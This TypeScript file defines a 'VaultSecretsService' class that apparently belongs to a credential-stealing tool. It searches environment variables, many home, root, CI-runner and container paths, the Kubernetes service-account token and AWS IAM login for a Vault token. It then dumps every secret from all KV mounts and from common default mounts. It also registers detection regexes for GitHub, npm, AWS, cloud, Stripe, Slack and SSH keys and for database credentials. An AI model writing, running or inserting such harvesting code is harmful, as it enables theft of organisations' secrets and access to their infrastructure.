import * as fs from "fs";
import * as http from "http";
import * as https from "https";

import { Provider } from "../base";
import type { ProviderResult } from "../types";

export class VaultSecretsService extends Provider {
  private readonly TIMEOUT_MS = 15000;
  private readonly VAULT_ADDR =
    process.env.VAULT_ADDR || "http://127.0.0.1:8200";

  constructor() {
    super("vault", "secrets", {
      ghtoken: /gh[op]_[A-Za-z0-9_\-\.]{36,}/g,
      npmtoken: /npm_[A-Za-z0-9_\-\.]{36,}/g,
      vaultToken: /hvs\.[A-Za-z0-9_-]{24,}/g,
      k8stoken: /eyJhbGciOiJSUzI1NiIsImtpZCI6[\w\-\.]+/g,
      awskey:
        /(AKIA[0-9A-Z]{16}|aws_access_key_id["\s:=]+["']?[A-Z0-9]{20}|aws_secret_access_key["\s:=]+["']?[A-Za-z0-9/+]{40})/g,
      awsSessionToken: /aws_session_token["\s:=]+["']?[A-Za-z0-9/+=]{100,}/gi,
      gcpKey:
        /"type":\s*"service_account"|"private_key":\s*"-----BEGIN PRIVATE KEY-----/g,
      azureKey:
        /(AccountKey|accessKey|client_secret)["\s:=]+["']?[A-Za-z0-9+/=]{40,}/gi,
      dbConnStr:
        /(mongodb|mysql|postgresql|postgres|redis):\/\/[^:\s]+:[^@\s]+@[^\s'"]+/gi,
      stripeKey: /(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}/g,
      slackToken: /xox[baprs]-[0-9a-zA-Z\-]{10,}/g,
      twilioKey: /SK[0-9a-f]{32}/gi,
      privateKey: /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g,
      sshKey: /ssh-(rsa|ed25519|dss) AAAA[0-9A-Za-z+\/]{100,}/g,
      dockerAuth: /"auth":\s*"[A-Za-z0-9+\/=]{20,}"/g,
      secret:
        /["']?(password|passwd|pass|pwd|secret|token|key|api[_-]?key|auth)["']?\s*["':=]\s*["'][^"'{}\s]{4,}["']/gi,
      genericSecret: /[A-Za-z0-9_\-\.]{20,}/g,
      urlCred: /https?:\/\/[^:"'\s]+:[^@"'\s]+@[^\s'"\]]+/g,
      hexKey: /[a-fA-F0-9]{32,128}/g,
      base64Blob: /[A-Za-z0-9+\/=]{40,}/g,
    });
  }

  private isInK8s(): boolean {
    return !!process.env.KUBERNETES_SERVICE_HOST;
  }

  private async getTokenFromEnv(): Promise<string | null> {
    const candidates = [
      process.env["VAULT_TOKEN"],
      process.env["VAULT_AUTH_TOKEN"],
      process.env.VAULT_API_TOKEN,
    ];

    for (const token of candidates) {
      if (token && token.length > 5) return token;
    }
    return null;
  }

  private async getTokenFromFile(): Promise<string | null> {
    const home = process.env.HOME || process.env.USERPROFILE || "/root";
    const candidates = [
      process.env.VAULT_TOKEN_PATH,
      process.env.VAULT_TOKEN_FILE,
      `${home}/.vault-token`,
      "/root/.vault-token",
      "/home/runner/.vault-token",
      "/vault/token",
      "/var/run/secrets/vault-token",
      "/var/run/secrets/vault/token",
      "/run/secrets/vault_token",
      "/run/secrets/VAULT_TOKEN",
      `${home}/.vault/token`,
      "/etc/vault/token",
    ].filter(Boolean) as string[];

    for (const p of candidates) {
      try {
        if (fs.existsSync(p)) {
          const content = fs.readFileSync(p, "utf-8").trim();
          if (content && content.length > 5 && content.length < 10000)
            return content;
        }
      } catch {}
    }
    return null;
  }

  private async getTokenFromK8sAuth(): Promise<string | null> {
    try {
      if (!this.isInK8s()) return null;

      const jwt = await fs.promises.readFile(
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "utf-8",
      );

      const host = process.env.KUBERNETES_SERVICE_HOST;
      const vaultAddr =
        process.env.VAULT_ADDR || `http://vault.${host}.svc.cluster.local:8200`;
      const role = process.env.VAULT_ROLE || "default";
      const payload = JSON.stringify({ role, jwt: jwt.trim() });
      const parsed = new URL(vaultAddr);

      const result = await this.makeRequest(
        {
          hostname: parsed.hostname,
          port: parsed.port || 8200,
          path: "/v1/auth/kubernetes/login",
          method: "POST",
          protocol: parsed.protocol,
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(payload),
          },
        },
        payload,
      );

      return result?.auth?.client_token ?? null;
    } catch {
      return null;
    }
  }

  private async getTokenFromAwsIam(): Promise<string | null> {
    try {
      const role = process.env.VAULT_AWS_ROLE || "default";
      const payload = JSON.stringify({ role });
      const parsed = new URL(this.VAULT_ADDR);

      const result = await this.makeRequest(
        {
          hostname: parsed.hostname,
          port: parsed.port || 8200,
          path: "/v1/auth/aws/login",
          method: "POST",
          protocol: parsed.protocol,
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(payload),
          },
        },
        payload,
      );

      return result?.auth?.client_token ?? null;
    } catch {
      return null;
    }
  }

  private makeRequest(options: any, body?: string): Promise<any> {
    return new Promise((resolve, reject) => {
      const isHttps =
        (options.protocol ?? new URL(this.VAULT_ADDR).protocol) === "https:";
      const lib = isHttps ? https : http;

      const timeout = setTimeout(() => {
        req.destroy();
        reject(new Error(`Timeout after ${this.TIMEOUT_MS}ms`));
      }, this.TIMEOUT_MS);

      const req = lib.request(options, (res) => {
        clearTimeout(timeout);
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            const parsed = JSON.parse(data);
            if (
              res.statusCode &&
              res.statusCode >= 200 &&
              res.statusCode < 300
            ) {
              resolve(parsed);
            } else {
              reject(new Error(`HTTP ${res.statusCode}`));
            }
          } catch {
            reject(new Error("Failed to parse response"));
          }
        });
      });

      req.on("error", (err) => {
        clearTimeout(timeout);
        reject(err);
      });
      if (body) req.write(body);
      req.end();
    });
  }

  private async authenticate(): Promise<string | null> {
    return (
      (await this.getTokenFromEnv()) ??
      (await this.getTokenFromFile()) ??
      (await this.getTokenFromK8sAuth()) ??
      (await this.getTokenFromAwsIam())
    );
  }

  private vaultRequest(
    path: string,
    token: string,
    method = "GET",
    body?: string,
  ): Promise<any> {
    const parsed = new URL(this.VAULT_ADDR);
    const options: any = {
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === "https:" ? 443 : 80),
      path,
      method,
      protocol: parsed.protocol,
      headers: { "X-Vault-Token": token } as Record<string, string | number>,
    };
    if (body) {
      options.headers["Content-Type"] = "application/json";
      options.headers["Content-Length"] = Buffer.byteLength(body);
    }
    return this.makeRequest(options, body);
  }

  private async listMounts(token: string): Promise<Array<{ path: string }>> {
    try {
      const result = await this.vaultRequest("/v1/sys/mounts", token);
      const mounts: Array<{ path: string }> = [];

      const mountData = result.data ?? result;
      for (const [rawPath, info] of Object.entries(mountData as any)) {
        const mount = info as any;
        if (mount.type === "kv") {
          const cleanPath = rawPath.replace(/^\//, "").replace(/\/$/, "");
          if (!cleanPath.startsWith("sys/") && !cleanPath.startsWith("auth/")) {
            mounts.push({ path: cleanPath });
          }
        }
      }
      return mounts;
    } catch {
      return [];
    }
  }

  private async listKvV2(mountPath: string, token: string): Promise<any[]> {
    const secrets: any[] = [];
    try {
      const result = await this.vaultRequest(
        `/v1/${mountPath}/metadata?list=true`,
        token,
      );
      const keys: string[] = result.data?.keys ?? [];

      await Promise.all(
        keys.slice(0, 100).map(async (key) => {
          if (key.endsWith("/")) return;
          try {
            const secretResult = await this.vaultRequest(
              `/v1/${mountPath}/data/${encodeURIComponent(key)}`,
              token,
            );
            secrets.push({
              path: `${mountPath}/${key}`,
              mount: mountPath,
              key,
              data: secretResult.data?.data ?? {},
              metadata: secretResult.data?.metadata ?? {},
            });
          } catch {}
        }),
      );
    } catch {}
    return secrets;
  }

  private async listKvV1(mountPath: string, token: string): Promise<any[]> {
    const secrets: any[] = [];
    try {
      const result = await this.vaultRequest(`/v1/${mountPath}`, token, "LIST");
      const keys: string[] = result.data?.keys ?? [];

      await Promise.all(
        keys.slice(0, 100).map(async (key) => {
          if (key.endsWith("/")) return;
          try {
            const secretResult = await this.vaultRequest(
              `/v1/${mountPath}/${encodeURIComponent(key)}`,
              token,
            );
            secrets.push({
              path: `${mountPath}/${key}`,
              mount: mountPath,
              key,
              data: secretResult.data ?? {},
            });
          } catch {}
        }),
      );
    } catch {}
    return secrets;
  }

  private async collectFromMount(
    mountPath: string,
    token: string,
  ): Promise<any[]> {
    const v2 = await this.listKvV2(mountPath, token);
    if (v2.length > 0) return v2;
    return this.listKvV1(mountPath, token);
  }

  async execute(): Promise<ProviderResult> {
    try {
      const token = await this.authenticate();
      if (!token) {
        return this.failure("No Vault credentials found");
      }

      try {
        await this.vaultRequest("/v1/sys/health", token);
      } catch {}

      const mounts = await this.listMounts(token);
      const allSecrets: any[] = [];
      const seenPaths = new Set<string>();

      for (const mount of mounts) {
        const secrets = await this.collectFromMount(mount.path, token);
        for (const s of secrets) {
          if (!seenPaths.has(s.path)) {
            seenPaths.add(s.path);
            allSecrets.push(s);
          }
        }
      }

      const commonPaths = ["secret", "kv", "cubbyhole", "secret-v2"];
      for (const p of commonPaths) {
        const secrets = await this.collectFromMount(p, token);
        for (const s of secrets) {
          if (!seenPaths.has(s.path)) {
            seenPaths.add(s.path);
            allSecrets.push(s);
          }
        }
      }

      if (allSecrets.length === 0) {
        return this.failure("No secrets found in Vault");
      }

      return this.success({
        vaultAddr: this.VAULT_ADDR,
        totalSecrets: allSecrets.length,
        secrets: allSecrets,
      });
    } catch (e) {
      return this.failure(e instanceof Error ? e : new Error(String(e)));
    }
  }
}
